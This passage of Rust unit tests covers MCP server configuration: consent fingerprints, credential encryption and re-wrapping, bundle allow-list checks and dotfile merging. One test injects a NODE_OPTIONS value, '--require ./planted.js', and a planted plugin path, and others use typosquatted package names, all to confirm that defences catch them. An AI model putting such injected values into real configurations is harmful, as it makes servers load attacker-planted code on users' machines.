            }"#,
        )
        .unwrap();

        assert_eq!(
            stored_secret_references(&server),
            vec![
                StoredSecretReference {
                    kind: StoredSecretKind::ApiKey,
                    provider: "anthropic".to_string(),
                },
                StoredSecretReference {
                    kind: StoredSecretKind::SignIn,
                    provider: "github".to_string(),
                },
            ]
        );
        assert!(!serde_json::to_string(&stored_secret_references(&server))
            .unwrap()
            .contains("sk-not-a-reference"));

        let remote = McpServerConfig {
            transport: Some(TransportConfig::Http(Box::new(
                crate::core::mcp::transport::HttpSseConfig {
                    url: "https://example.invalid/mcp".to_string(),
                    bearer_token: Some("<from_oauth:slack>".to_string()),
                    ..Default::default()
                },
            ))),
            env: HashMap::new(),
            ..server
        };
        assert_eq!(
            serde_json::to_value(stored_secret_references(&remote)).unwrap(),
            serde_json::json!([{ "kind": "signIn", "provider": "slack" }])
        );
    }

    #[test]
    fn handing_a_server_a_saved_key_it_was_not_handed_before_needs_consent_again() {
        let literal: McpServerConfig =
            serde_json::from_str(r#"{"command": "npx", "env": {"OPENAI_API_KEY": "sk-typed-in"}}"#)
                .unwrap();
        let mut saved = literal.clone();
        saved.env.insert(
            "OPENAI_API_KEY".to_string(),
            "<from_api_key:openai>".to_string(),
        );
        assert_ne!(
            project_server_fingerprint(&literal),
            project_server_fingerprint(&saved),
            "a typed-in value replaced by a saved key is a different launch"
        );
        let mut added = literal.clone();
        added.env.insert(
            "SECOND_KEY".to_string(),
            "<from_api_key:anthropic>".to_string(),
        );
        assert_ne!(
            project_server_fingerprint(&literal),
            project_server_fingerprint(&added)
        );

        let http = |bearer_token: &str| McpServerConfig {
            transport: Some(TransportConfig::Http(Box::new(
                crate::core::mcp::transport::HttpSseConfig {
                    url: "https://example.invalid/mcp".to_string(),
                    bearer_token: Some(bearer_token.to_string()),
                    ..Default::default()
                },
            ))),
            ..literal.clone()
        };
        assert_ne!(
            project_server_fingerprint(&http("token-typed-in")),
            project_server_fingerprint(&http("<from_api_key:openai>")),
            "a remote server newly sent a saved key asks again"
        );
    }

    #[test]
    fn naming_a_different_stored_credential_needs_consent_again() {
        let server: McpServerConfig = serde_json::from_str(
            r#"{"command": "npx", "env": {"GITHUB_TOKEN": "<from_credential_manager>"}}"#,
        )
        .unwrap();
        let mut retargeted = server.clone();
        retargeted.env.insert(
            "GITHUB_TOKEN".to_string(),
            "<from_api_key:anthropic>".to_string(),
        );
        assert_ne!(
            project_server_fingerprint(&server),
            project_server_fingerprint(&retargeted),
            "the same secret-looking name now asks for another stored credential"
        );

        let http = |bearer_token: &str| McpServerConfig {
            transport: Some(TransportConfig::Http(Box::new(
                crate::core::mcp::transport::HttpSseConfig {
                    url: "https://example.invalid/mcp".to_string(),
                    bearer_token: Some(bearer_token.to_string()),
                    ..Default::default()
                },
            ))),
            ..server.clone()
        };
        assert_ne!(
            project_server_fingerprint(&http("<from_oauth:github>")),
            project_server_fingerprint(&http("<from_oauth:slack>"))
        );
        assert_eq!(
            project_server_fingerprint(&http("token-a")),
            project_server_fingerprint(&http("token-b")),
            "a rotated literal token is the same launch"
        );
    }

    #[test]
    fn consent_covers_the_launch_not_the_switch() {
        let server: McpServerConfig =
            serde_json::from_str(r#"{"command": "npx", "args": ["a"]}"#).unwrap();
        let mut switched_off = server.clone();
        switched_off.enabled = false;
        let mut changed = server.clone();
        changed.args.push("--extra".to_string());

        assert_eq!(
            project_server_fingerprint(&server),
            project_server_fingerprint(&switched_off)
        );
        assert_ne!(
            project_server_fingerprint(&server),
            project_server_fingerprint(&changed)
        );
    }

    #[test]
    fn the_same_launch_hashes_the_same_whatever_order_its_maps_were_built_in() {
        let names = ["API_KEY", "BASE_URL", "REGION", "NODE_OPTIONS", "PATH"];
        let build = |order: &[&str]| {
            let mut server: McpServerConfig =
                serde_json::from_str(r#"{"command": "npx", "args": ["-y", "tool"]}"#).unwrap();
            for name in order {
                server.env.insert(name.to_string(), format!("{name}-value"));
            }
            server
        };
        let forward = build(&names);
        let mut reversed_names = names;
        reversed_names.reverse();
        let reversed = build(&reversed_names);
        for _ in 0..20 {
            assert_eq!(
                project_server_fingerprint(&forward),
                project_server_fingerprint(&build(&reversed_names))
            );
        }
        assert_eq!(
            project_server_fingerprint(&forward),
            project_server_fingerprint(&reversed)
        );

        let mut rotated = forward.clone();
        rotated
            .env
            .insert("API_KEY".to_string(), "rotated-secret".to_string());
        assert_eq!(
            project_server_fingerprint(&forward),
            project_server_fingerprint(&rotated),
            "a rotated secret is the same launch"
        );
        let mut steered = forward.clone();
        steered.env.insert(
            "NODE_OPTIONS".to_string(),
            "--require ./planted.js".to_string(),
        );
        assert_ne!(
            project_server_fingerprint(&forward),
            project_server_fingerprint(&steered),
            "a value that decides what code runs is a different launch"
        );
        let mut retargeted = forward.clone();
        retargeted
            .env
            .insert("BASE_URL".to_string(), "./planted-plugin".to_string());
        assert_ne!(
            project_server_fingerprint(&forward),
            project_server_fingerprint(&retargeted),
            "every value whose name is not a secret is pinned"
        );

        let http = |order: &[&str], token: &str| {
            let mut headers = HashMap::new();
            for name in order {
                headers.insert(name.to_string(), token.to_string());
            }
            McpServerConfig {
                transport: Some(TransportConfig::Http(Box::new(
                    crate::core::mcp::transport::HttpSseConfig {
                        url: "https://example.invalid/mcp".to_string(),
                        headers,
                        ..Default::default()
                    },
                ))),
                ..build(&[])
            }
        };
        assert_eq!(
            project_server_fingerprint(&http(&names, "a")),
            project_server_fingerprint(&http(&reversed_names, "b")),
            "header order and header values do not change the launch"
        );
        assert_ne!(
            project_server_fingerprint(&http(&names, "a")),
            project_server_fingerprint(&http(&names[0..2], "a"))
        );
    }

    #[test]
    fn letting_a_project_server_reach_this_computer_needs_consent_again() {
        let server: McpServerConfig =
            serde_json::from_str(r#"{"command": "npx", "args": ["-y", "postgres-mcp"]}"#).unwrap();
        assert!(!server.allow_local_network);
        assert!(
            !serde_json::to_string(&server)
                .unwrap()
                .contains("allowLocalNetwork"),
            "a launch consented before the flag existed keeps its fingerprint"
        );
        let opened: McpServerConfig = serde_json::from_str(
            r#"{"command": "npx", "args": ["-y", "postgres-mcp"], "allowLocalNetwork": true}"#,
        )
        .unwrap();
        assert!(opened.allow_local_network);

        let mut config = McpServersConfig {
            mcp_servers: HashMap::from([("db".to_string(), opened)]),
        };
        let disabled = config.disable_unconsented_servers_with(|_, candidate| {
            project_server_fingerprint(candidate) == project_server_fingerprint(&server)
        });
        assert_eq!(disabled, 1);
        assert!(!config.mcp_servers["db"].enabled);
    }

    #[test]
    fn transport_credential_at_rest_roundtrip() {
        let secret = "sk-super-secret-bearer-token";
        let encrypted = maybe_encrypt_at_rest(secret).expect("raw value should encrypt");
        assert!(encrypted.starts_with(ENCRYPTED_AT_REST_PREFIX));
        assert!(
            !encrypted.contains(secret),
            "encrypted-at-rest value must not contain the plaintext secret"
        );
        let decrypted = maybe_decrypt_at_rest(&encrypted, "test:mcp").expect("should decrypt");
        assert_eq!(decrypted.value, secret);
        assert!(
            !decrypted.from_legacy_key,
            "a value this build encrypted must not be reported as legacy"
        );

        // Placeholders / already-encrypted / empty are NOT re-encrypted.
        assert!(maybe_encrypt_at_rest("<from_api_key:vercel>").is_none());
        assert!(maybe_encrypt_at_rest(&encrypted).is_none());
        assert!(maybe_encrypt_at_rest("").is_none());
        // Plaintext / placeholders are NOT treated as encrypted on load.
        assert!(maybe_decrypt_at_rest("plaintext-token", "test:mcp").is_none());
        assert!(maybe_decrypt_at_rest("<from_api_key:vercel>", "test:mcp").is_none());
    }

    fn legacy_mcp_key() -> [u8; 32] {
        crate::sys::security::machine_key::legacy_machine_only_keys(
            crate::sys::security::machine_key::KeyPurpose::McpCredentials,
        )
        .first()
        .copied()
        .expect("a legacy candidate always exists")
    }

    /// The re-wrap runs off the loading task, so the file changes shortly after
    /// `from_file` returns.
    async fn config_after_rewrap(path: &std::path::Path, legacy_ciphertext: &str) -> String {
        for _ in 0..200 {
            let current = std::fs::read_to_string(path).expect("read the project config");
            if !current.contains(legacy_ciphertext) {
                return current;
            }
            tokio::time::sleep(std::time::Duration::from_millis(25)).await;
        }
        panic!("the legacy credential was never re-wrapped");
    }

    /// A shipped build encrypted this credential under a key derived from
    /// machine identifiers alone, which any local process can recompute from a
    /// stolen copy of the file. Loading it must still return the credential,
    /// and must leave the file unreadable under that key.
    ///
    /// The startup sweep enumerates only the app-level config and the project
    /// that is already open, so a project config under any other root is
    /// re-wrapped only through this path.
    #[tokio::test]
    async fn a_project_config_written_by_an_older_build_is_read_and_rewrapped() {
        use crate::sys::security::machine_key::{self, KeyPurpose};
        use crate::sys::security::machine_key_rewrap;

        let token = "sk-legacy-project-token";
        let legacy_ciphertext =
            machine_key_rewrap::encrypt_combined(&legacy_mcp_key(), token).expect("legacy encrypt");

        let dir = tempfile::tempdir().expect("temp dir");
        let path = dir.path().join(PROJECT_MCP_CONFIG_FILENAME);
        std::fs::write(
            &path,
            format!(
                "{{\"mcpServers\":{{\"vercel\":{{\"transport\":{{\"type\":\"http\",\
                 \"url\":\"https://mcp.example.com\",\
                 \"bearer_token\":\"{ENCRYPTED_AT_REST_PREFIX}{legacy_ciphertext}>\"}}}}}}}}"
            ),
        )
        .expect("seed a legacy project config");

        let config = McpServersConfig::from_file(&path)
            .await
            .expect("a config an older build wrote must still load");
        let Some(TransportConfig::Http(http)) = config.mcp_servers["vercel"].transport.clone()
        else {
            panic!("the seeded server must keep its http transport");
        };
        assert_eq!(
            http.bearer_token.as_deref(),
            Some(token),
            "a credential an older build encrypted must still decrypt"
        );

        let rewritten = config_after_rewrap(&path, &legacy_ciphertext).await;
        let start = rewritten.find(ENCRYPTED_AT_REST_PREFIX).expect("marker")
            + ENCRYPTED_AT_REST_PREFIX.len();
        let end = rewritten[start..].find('>').expect("terminator") + start;
        let rotated = &rewritten[start..end];

        let current = machine_key::try_derive_key(KeyPurpose::McpCredentials)
            .expect("install secret in tests");
        assert_eq!(
            machine_key_rewrap::decrypt_combined(&current, rotated).as_deref(),
            Some(token),
            "the re-wrapped credential must open under the per-install key"
        );
        assert_eq!(
            machine_key_rewrap::decrypt_combined(&legacy_mcp_key(), rotated),
            None,
            "the re-wrapped credential must not open under the recomputable machine-only key"
        );
    }

    // BASE-008: this was `#[ignore]`d with the note "pre-existing reasoned skip",
    // which states that it was skipped, not why. There is no why: the body
    // constructs a default struct in memory and asserts four fields, no
    // network, no filesystem, no external binary, nothing that could make it
    // opt-in. The six genuinely-ignored tests in tests/mcp_integration_test.rs
    // need a network-installable MCP server binary; this one needs nothing.
    // Un-ignored and running.
    #[test]
    fn test_default_config() {
        let config = McpServersConfig::default();
        assert!(config.mcp_servers.contains_key("filesystem"));
        assert!(config.mcp_servers.contains_key("github"));
        assert!(
            !config.mcp_servers["filesystem"].enabled,
            "packaged filesystem MCP must be opt-in because starting npx can install code and egress"
        );
        assert!(
            !config.mcp_servers["git"].enabled,
            "packaged git MCP must be opt-in"
        );
        assert!(!config.mcp_servers["github"].enabled);
    }

    #[test]
    fn test_serialize_deserialize() {
        let config = McpServersConfig::default();
        let json = serde_json::to_string(&config).unwrap();
        let deserialized: McpServersConfig = serde_json::from_str(&json).unwrap();
        assert_eq!(config.mcp_servers.len(), deserialized.mcp_servers.len());
    }

    // ── Bug #18: Config decryption tests ─────────────────────────────────

    #[test]
    fn test_encrypt_decrypt_oauth_token_roundtrip() {
        let original = "ghp_abc123DEF456_test_token";
        let encrypted =
            encrypt_oauth_token(original).expect("encryption should succeed for a valid plaintext");
        let decrypted = decrypt_oauth_token(&encrypted)
            .expect("decryption should succeed for validly-encrypted data");
        assert_eq!(decrypted, original);
    }

    #[test]
    fn test_encrypt_decrypt_mcp_credential_roundtrip() {
        let original = "sk-test-credential-value-123";
        let encrypted = encrypt_mcp_credential(original)
            .expect("encryption should succeed for a valid plaintext");
        let decrypted = decrypt_mcp_credential(&encrypted)
            .expect("decryption should succeed for validly-encrypted data");
        assert_eq!(decrypted, original);
    }

    #[test]
    fn test_decrypt_oauth_token_invalid_base64() {
        let result = decrypt_oauth_token("not!valid!base64!@#$%");
        assert!(result.is_err());
        let err = result.unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("not valid base64"),
            "error should mention base64, got: {}",
            msg
        );
    }

    #[test]
    fn test_decrypt_mcp_credential_invalid_base64() {
        let result = decrypt_mcp_credential("~~~invalid~~~");
        assert!(result.is_err());
        let err = result.unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("not valid base64"),
            "error should mention base64, got: {}",
            msg
        );
    }

    #[test]
    fn test_decrypt_oauth_token_ciphertext_too_short() {
        use base64::{engine::general_purpose, Engine as _};
        // Encode only 5 bytes -- well below the 12-byte nonce requirement
        let short_payload = general_purpose::STANDARD.encode([0u8; 5]);
        let result = decrypt_oauth_token(&short_payload);
        assert!(result.is_err());
        let err = result.unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("too short"),
            "error should mention 'too short', got: {}",
            msg
        );
    }

    #[test]
    fn test_decrypt_mcp_credential_ciphertext_too_short() {
        use base64::{engine::general_purpose, Engine as _};
        let short_payload = general_purpose::STANDARD.encode([0u8; 8]);
        let result = decrypt_mcp_credential(&short_payload);
        assert!(result.is_err());
        let err = result.unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("too short"),
            "error should mention 'too short', got: {}",
            msg
        );
    }

    #[test]
    fn test_decrypt_oauth_token_tampered_ciphertext() {
        let original = "valid_token_value";
        let encrypted = encrypt_oauth_token(original).expect("encryption should succeed");

        // Tamper with the encrypted payload by flipping bits in the ciphertext portion
        use base64::{engine::general_purpose, Engine as _};
        let mut raw = general_purpose::STANDARD
            .decode(&encrypted)
            .expect("should be valid base64");
        // Flip a byte in the ciphertext (past the 12-byte nonce)
        if raw.len() > 14 {
            raw[14] ^= 0xFF;
        }
        let tampered = general_purpose::STANDARD.encode(&raw);

        let result = decrypt_oauth_token(&tampered);
        assert!(result.is_err());
        let err = result.unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("decryption failed") || msg.contains("tampered"),
            "error should mention decryption failure, got: {}",
            msg
        );
    }

    #[test]
    fn test_decrypt_mcp_credential_tampered_ciphertext() {
        let original = "my-secret-credential";
        let encrypted = encrypt_mcp_credential(original).expect("encryption should succeed");

        use base64::{engine::general_purpose, Engine as _};
        let mut raw = general_purpose::STANDARD
            .decode(&encrypted)
            .expect("should be valid base64");
        if raw.len() > 14 {
            raw[14] ^= 0xFF;
        }
        let tampered = general_purpose::STANDARD.encode(&raw);

        let result = decrypt_mcp_credential(&tampered);
        assert!(result.is_err());
        let err = result.unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("decryption failed") || msg.contains("tampered"),
            "error should mention decryption failure, got: {}",
            msg
        );
    }

    #[test]
    fn test_validate_decrypted_credential_empty_string() {
        let result = validate_decrypted_credential("");
        assert!(result.is_err());
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("empty"),
            "error should mention empty, got: {}",
            msg
        );
    }

    #[test]
    fn test_validate_decrypted_credential_control_characters() {
        // NUL byte indicates corrupted output
        let result = validate_decrypted_credential("token\x00value");
        assert!(result.is_err());
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("control characters"),
            "error should mention control characters, got: {}",
            msg
        );
    }

    #[test]
    fn test_validate_decrypted_credential_allows_whitespace() {
        // Tabs and newlines are allowed (e.g., for PEM keys)
        assert!(validate_decrypted_credential("line1\nline2\ttab").is_ok());
        assert!(validate_decrypted_credential("value\r\n").is_ok());
    }

    #[test]
    fn test_validate_decrypted_credential_normal_token() {
        assert!(validate_decrypted_credential("ghp_abcDEF123456789").is_ok());
        assert!(validate_decrypted_credential("sk-proj-abc123").is_ok());
        assert!(validate_decrypted_credential("Bearer eyJhbGciOi...").is_ok());
    }

    #[test]
    fn test_config_decryption_error_display() {
        // Ensure all variants produce non-empty, distinct messages
        let errors = [
            ConfigDecryptionError::CipherInit,
            ConfigDecryptionError::CiphertextTooShort { len: 3 },
            ConfigDecryptionError::DecryptionFailed,
            ConfigDecryptionError::ValidationFailed("test reason".to_string()),
        ];
        let messages: Vec<String> = errors.iter().map(|e| e.to_string()).collect();
        for msg in &messages {
            assert!(!msg.is_empty(), "error display should not be empty");
        }
        // All messages should be distinct
        for i in 0..messages.len() {
            for j in (i + 1)..messages.len() {
                assert_ne!(
                    messages[i], messages[j],
                    "error messages should be distinct"
                );
            }
        }
    }

    // ── McpBundle tests ──────────────────────────────────────────────────────

    fn sample_bundle() -> McpBundle {
        let mut servers = HashMap::new();
        servers.insert(
            "filesystem".to_string(),
            McpServerConfig {
                command: "npx".to_string(),
                args: vec![
                    "-y".to_string(),
                    "@modelcontextprotocol/server-filesystem".to_string(),
                    ".".to_string(),
                ],
                env: HashMap::new(),
                enabled: true,
                transport: None,
                allow_local_network: false,
            },
        );
        McpBundle {
            magic: "mcpb/1".to_string(),
            name: "Test Bundle".to_string(),
            version: "1.0.0".to_string(),
            description: Some("A test bundle".to_string()),
            servers,
            metadata: HashMap::new(),
        }
    }

    #[test]
    fn test_bundle_serde_roundtrip() {
        let bundle = sample_bundle();
        let json = serde_json::to_string(&bundle).unwrap();
        assert!(json.contains("mcpb/1"));
        assert!(json.contains("Test Bundle"));
        assert!(json.contains("filesystem"));

        let deserialized: McpBundle = serde_json::from_str(&json).unwrap();
        assert_eq!(deserialized.name, bundle.name);
        assert_eq!(deserialized.version, bundle.version);
        assert_eq!(deserialized.servers.len(), 1);
    }

    #[test]
    fn test_bundle_validate_ok() {
        let bundle = sample_bundle();
        assert!(bundle.validate().is_ok());
    }

    #[test]
    fn test_bundle_validate_wrong_magic() {
        let mut bundle = sample_bundle();
        bundle.magic = "mcpb/99".to_string();
        let result = bundle.validate();
        assert!(result.is_err());
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("Unsupported bundle format"), "got: {}", msg);
    }

    #[test]
    fn test_bundle_validate_empty_name() {
        let mut bundle = sample_bundle();
        bundle.name = "  ".to_string();
        let result = bundle.validate();
        assert!(result.is_err());
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("name"), "got: {}", msg);
    }

    #[test]
    fn test_bundle_validate_empty_version() {
        let mut bundle = sample_bundle();
        bundle.version = String::new();
        let result = bundle.validate();
        assert!(result.is_err());
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("version"), "got: {}", msg);
    }

    #[test]
    fn test_install_bundle_merges_servers() {
        let bundle = sample_bundle();
        let mut config = McpServersConfig {
            mcp_servers: HashMap::new(),
        };

        install_bundle(&bundle, &mut config, &permitting_allowlist()).unwrap();
        assert_eq!(config.mcp_servers.len(), 1);
        assert!(config.mcp_servers.contains_key("filesystem"));
    }

    #[test]
    fn oauth_placeholder_providers_cover_env_and_bearer_token() {
        let stdio = McpServerConfig {
            command: "npx".to_string(),
            args: Vec::new(),
            env: HashMap::from([
                (
                    "GITHUB_TOKEN".to_string(),
                    "<from_oauth:github>".to_string(),
                ),
                ("OTHER".to_string(), "<from_oauth:github>".to_string()),
                ("PLAIN".to_string(), "value".to_string()),
            ]),
            enabled: true,
            transport: None,
            allow_local_network: false,
        };
        assert_eq!(
            oauth_placeholder_providers(&stdio),
            vec!["github".to_string()]
        );

        let remote = McpServerConfig {
            command: String::new(),
            args: Vec::new(),
            env: HashMap::new(),
            enabled: true,
            transport: Some(TransportConfig::Http(Box::new(
                super::super::transport::HttpSseConfig {
                    url: "https://mcp.example.com".to_string(),
                    bearer_token: Some("<from_oauth:slack>".to_string()),
                    ..Default::default()
                },
            ))),
            allow_local_network: false,
        };
        assert_eq!(
            oauth_placeholder_providers(&remote),
            vec!["slack".to_string()]
        );
        assert!(oauth_placeholder_provider("<from_api_key:slack>").is_none());
    }

    fn permitting_allowlist() -> AllowlistState {
        AllowlistState::Loaded(crate::core::mcp::manifest::Manifest {
            version: 2,
            allowed_packages: vec![crate::core::mcp::manifest::AllowedPackage {
                name: "@modelcontextprotocol/server-filesystem".to_string(),
                version: "2026.8.31".to_string(),
                integrity: "sha512-kKaFkyAh6oipvc9+EAbJ552JafnMnOq5nzmzWkp1jJdBhTAAGpmIpWihUG1+rfNhmEFM98gUZDdCHCDD4v6a7Q==".to_string(),
                allow_scripts: false,
            }],
        })
    }

    fn bundle_launching(package: &str) -> McpBundle {
        let mut bundle = sample_bundle();
        let server = bundle.servers.get_mut("filesystem").unwrap();
        server.args = vec!["-y".to_string(), package.to_string(), ".".to_string()];
        bundle
    }

    #[test]
    fn install_bundle_refuses_a_package_the_allowlist_does_not_name() {
        let bundle = bundle_launching("@modelcontextprotocol/server-filesystemm");
        let mut config = McpServersConfig {
            mcp_servers: HashMap::new(),
        };

        let err = install_bundle(&bundle, &mut config, &permitting_allowlist()).unwrap_err();

        assert!(
            err.to_string().contains("not on the allow-list"),
            "got: {err}"
        );
        assert!(config.mcp_servers.is_empty());
    }

    #[test]
    fn install_bundle_refuses_a_versioned_typosquat() {
        let bundle = bundle_launching("@modelcontextprotocol/server-filesysten@1.4.2");
        let mut config = McpServersConfig {
            mcp_servers: HashMap::new(),
        };

        assert!(install_bundle(&bundle, &mut config, &permitting_allowlist()).is_err());
        assert!(config.mcp_servers.is_empty());
    }

    #[test]
    fn install_bundle_accepts_a_listed_package_carrying_a_version() {
        let bundle = bundle_launching("@modelcontextprotocol/server-filesystem@1.4.2");
        let mut config = McpServersConfig {
            mcp_servers: HashMap::new(),
        };

        install_bundle(&bundle, &mut config, &permitting_allowlist()).unwrap();
        assert!(config.mcp_servers.contains_key("filesystem"));
    }

    #[test]
    fn install_bundle_without_a_packaged_allowlist_denies_in_release() {
        let bundle = sample_bundle();
        let mut config = McpServersConfig {
            mcp_servers: HashMap::new(),
        };

        let outcome = install_bundle(&bundle, &mut config, &AllowlistState::Absent);

        assert_eq!(outcome.is_ok(), cfg!(debug_assertions));
        assert_eq!(config.mcp_servers.is_empty(), !cfg!(debug_assertions));
    }

    #[test]
    fn test_install_bundle_overwrites_existing() {
        let bundle = sample_bundle();
        let mut config = McpServersConfig {
            mcp_servers: {
                let mut m = HashMap::new();
                // Pre-existing entry with different command
                m.insert(
                    "filesystem".to_string(),
                    McpServerConfig {
                        command: "old-npx".to_string(),
                        args: vec![],
                        env: HashMap::new(),
                        enabled: false,
                        transport: None,
                        allow_local_network: false,
                    },
                );
                m
            },
        };

        install_bundle(&bundle, &mut config, &permitting_allowlist()).unwrap();
        let fs = config.mcp_servers.get("filesystem").unwrap();
        // Should now have the bundle's version
        assert_eq!(fs.command, "npx", "existing entry should be overwritten");
        assert!(fs.enabled, "enabled should match bundle server config");
    }

    #[test]
    fn test_load_bundle_from_tempfile() {
        let bundle = sample_bundle();
        let json = serde_json::to_string(&bundle).unwrap();

        let dir = std::env::temp_dir();
        let path = dir.join("test_bundle_load.mcpb");
        std::fs::write(&path, &json).unwrap();

        let loaded = load_bundle(&path).unwrap();
        assert_eq!(loaded.name, "Test Bundle");
        assert_eq!(loaded.version, "1.0.0");
        assert_eq!(loaded.servers.len(), 1);

        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn test_load_bundle_missing_file() {
        let result = load_bundle(std::path::Path::new("/nonexistent/path/bundle.mcpb"));
        assert!(result.is_err());
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("Failed to read bundle file"), "got: {}", msg);
    }

    #[test]
    fn test_load_bundle_invalid_json() {
        let dir = std::env::temp_dir();
        let path = dir.join("test_bundle_invalid.mcpb");
        std::fs::write(&path, "{ not valid json }").unwrap();

        let result = load_bundle(&path);
        assert!(result.is_err());
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("Failed to parse bundle file"), "got: {}", msg);
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn test_bundle_magic_default() {
        // JSON without "magic" field should deserialise to the default value
        let json = r#"{"name":"No-Magic Bundle","version":"0.1.0","servers":{}}"#;
        let bundle: McpBundle = serde_json::from_str(json).unwrap();
        assert_eq!(bundle.magic, "mcpb/1");
    }

    // ── merge_dotfile_servers (DESKTOP-MCP-DOTFILE-CONFIG-FAKE-SUCCESS-01) ──

    fn with_temp_dotfile<F: FnOnce(&std::path::Path)>(body: F) {
        let temp = tempfile::tempdir().expect("failed to create tempdir");
        body(temp.path());
    }

    fn write_dotfile_mcp_json(home: &std::path::Path, json: &str) {
        let dir = home.join(".agiworkforce");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("mcp.json"), json).unwrap();
    }

    #[test]
    fn merge_dotfile_servers_adds_new_server() {
        with_temp_dotfile(|home| {
            write_dotfile_mcp_json(
                home,
                r#"{"mcpServers":{"my-tool":{"command":"npx","args":["-y","some-pkg"]}}}"#,
            );

            let mut config = McpServersConfig {
                mcp_servers: HashMap::new(),
            };
            config.merge_dotfile_servers_at(&home.join(".agiworkforce/mcp.json"));

            let server = config
                .mcp_servers
                .get("my-tool")
                .expect("dotfile server should be merged in");
            assert_eq!(server.command, "npx");
            assert_eq!(server.args, vec!["-y".to_string(), "some-pkg".to_string()]);
            assert!(
                !server.enabled,
                "shared dotfile discovery must not grant Desktop startup approval"
            );
        });
    }

    #[test]
    fn merge_dotfile_servers_primary_config_wins_on_name_collision() {
        with_temp_dotfile(|home| {
            write_dotfile_mcp_json(
                home,
                r#"{"mcpServers":{"shared":{"command":"dotfile-cmd","args":[]}}}"#,
            );

            let mut mcp_servers = HashMap::new();
            mcp_servers.insert(
                "shared".to_string(),
                McpServerConfig {
                    command: "primary-cmd".to_string(),
                    args: vec![],
                    env: HashMap::new(),
                    enabled: true,
                    transport: None,
                    allow_local_network: false,
                },
            );
            let mut config = McpServersConfig { mcp_servers };
            config.merge_dotfile_servers_at(&home.join(".agiworkforce/mcp.json"));

            assert_eq!(
                config.mcp_servers.get("shared").unwrap().command,
                "primary-cmd",
                "primary config must win on name collisions"
            );
        });
    }

    #[test]
    fn merge_dotfile_servers_skips_entry_without_command_or_transport() {
        with_temp_dotfile(|home| {
            write_dotfile_mcp_json(home, r#"{"mcpServers":{"broken":{"env":{}}}}"#);

            let mut config = McpServersConfig {
                mcp_servers: HashMap::new(),
            };
            config.merge_dotfile_servers_at(&home.join(".agiworkforce/mcp.json"));

            assert!(
                !config.mcp_servers.contains_key("broken"),
                "entries with no command or transport must not be merged in"
            );
        });
    }

    #[test]
    fn merge_dotfile_servers_noop_when_file_missing() {
        with_temp_dotfile(|home| {
            let mut config = McpServersConfig {
                mcp_servers: HashMap::new(),
            };
            config.merge_dotfile_servers_at(&home.join(".agiworkforce/mcp.json"));
            assert!(config.mcp_servers.is_empty());
        });
    }

    // ── write_dotfile_servers (import_ecosystem_mcp_servers persistence fix) ──

    #[test]
    fn write_dotfile_servers_creates_file_when_missing() {
        with_temp_dotfile(|home| {
            let entries = vec![(
                "claude:filesystem".to_string(),
                McpServerConfig {
                    command: "npx".to_string(),
                    args: vec!["-y".to_string(), "some-pkg".to_string()],
                    env: HashMap::new(),
                    enabled: true,
                    transport: None,
                    allow_local_network: false,
                },
            )];

            let written = McpServersConfig::write_dotfile_servers_at(
                &home.join(".agiworkforce/mcp.json"),
                &entries,
            )
            .expect("write_dotfile_servers should succeed");
            assert_eq!(written, 1);

            let dotfile_path = home.join(".agiworkforce").join("mcp.json");
            let content = std::fs::read_to_string(&dotfile_path).expect("dotfile should exist");
            let parsed: serde_json::Value =
                serde_json::from_str(&content).expect("dotfile should be valid JSON");
            let servers = parsed
                .get("mcpServers")
                .and_then(|v| v.as_object())
                .expect("mcpServers object");
            assert!(servers.contains_key("claude:filesystem"));
            assert_eq!(servers["claude:filesystem"]["command"], "npx");

            // And the newly-written entry actually merges back in for the
            // live client, the exact mechanism `reload_active_config` relies
            // on, proving this is the same durable persistence path as
            // `dotfile_add_mcp_server`.
            let mut config = McpServersConfig {
                mcp_servers: HashMap::new(),
            };
            config.merge_dotfile_servers_at(&home.join(".agiworkforce/mcp.json"));
            assert!(config.mcp_servers.contains_key("claude:filesystem"));
        });
    }

    #[test]
    fn write_dotfile_servers_preserves_existing_entries_and_overwrites_collisions() {
        with_temp_dotfile(|home| {
            write_dotfile_mcp_json(
                home,
                r#"{"mcpServers":{"existing":{"command":"npx","args":["-y","old-pkg"]}}}"#,
            );

            let entries = vec![(
                "existing".to_string(),
                McpServerConfig {
                    command: "npx".to_string(),
                    args: vec!["-y".to_string(), "new-pkg".to_string()],
                    env: HashMap::new(),
                    enabled: true,
                    transport: None,
                    allow_local_network: false,
                },
            )];
            McpServersConfig::write_dotfile_servers_at(
                &home.join(".agiworkforce/mcp.json"),
                &entries,
            )
            .expect("write should succeed");

            let dotfile_path = home.join(".agiworkforce").join("mcp.json");
            let content = std::fs::read_to_string(&dotfile_path).unwrap();
            let parsed: serde_json::Value = serde_json::from_str(&content).unwrap();
            assert_eq!(
                parsed["mcpServers"]["existing"]["args"][1],
                serde_json::json!("new-pkg"),
                "same-name entries should be overwritten, last write wins"
            );
        });
    }

    #[test]
    fn write_dotfile_servers_is_a_noop_for_empty_entries() {
        with_temp_dotfile(|home| {
            let written = McpServersConfig::write_dotfile_servers_at(
                &home.join(".agiworkforce/mcp.json"),
                &[],
            )
            .expect("empty write should succeed");
            assert_eq!(written, 0);
            let dotfile_path = home.join(".agiworkforce").join("mcp.json");
            assert!(
                !dotfile_path.exists(),
                "an empty entry list must not create the dotfile"
            );
        });
    }
}
